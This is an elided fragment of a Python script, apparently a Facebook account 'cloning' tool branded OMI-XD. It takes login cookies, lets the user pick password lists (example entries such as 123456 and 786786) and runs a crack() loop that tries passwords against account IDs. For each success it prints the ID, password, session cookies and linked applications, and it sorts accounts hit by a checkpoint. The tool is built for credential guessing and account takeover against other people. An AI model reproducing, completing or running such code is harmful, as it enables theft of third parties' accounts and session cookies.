...
#Chnge Name 
	print('[[\x1b[1;92mOMI\x1b[1;97m] [\x1b[1;97mMR-OMI-XD]')
...
def login_lagi334():
	try:
		...
		cookie=input(f'  [{h}OMI{u}] INPUT COOKIES :{asu} ')
		...
		print(f'  {u}[{h}OMI{u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	alvino_xy(f'{h}IP  : {ip}')
	cetak(nel('\t[bold cyan]           OMI CHOOSE CLONING MENU OMI [/bold cyan]'))
	print('')
...
#-------------[ Id -Crackiing]---------------#
def setting():
	cetak(nel('\t[bold cyan]         CLONING MENU OMI [/bold cyan]'))
	print('') 
	...
	if hu in ['1','01']:
		...
		print('=>TRY AGAIN')
		exit()
	cetak(nel('\t[bold cyan]             OMI METHODE LOGIN OMI [/bold cyan]'))
	print('') 
...
#   elif _jembot_ in ['y','Y']:
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[purple]OMI[yellow]] ADD PASWORD MXM 6 WORDS\n[[purple]OMI[yellow]] EXIMPLE :[green] 556677,786786,123456[purple] '))
...
def passwrd():
	...
	print(f'[{h}OMI{u}]{h} OK : {h}%s '%(ok))
	print(f'{k}[{k}OMI{h}]{k} CP : {k}%s{u} '%(cp))
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}OMI-XD-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]тАФ{P}[{H}{ok}{P}]тАФ{P}[{k}{cp}{x}]тАФ[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     тЬи OMI-CHECKPOINT тЬи [red]'))
				...
				cetak(nel('[green]      тЭдя╕ПтЬи OMI-OK тЭдя╕ПтЬи[green]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[OMI] ID       : {idf} [OMI] PASSWORD : {pw}'
				...
				if 'no' in taplikasi:
					...
					infoakun += (f"\n[bold cyan][OMI] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					...
					hit=0
					infoakun += (f"\n[bold yellow][OMI] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					...
					print('\n')
					statusok = f'[bold green][OMI] ID       : {idf}\n[OMI] PASSWORD : {pw}\n[OMI] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
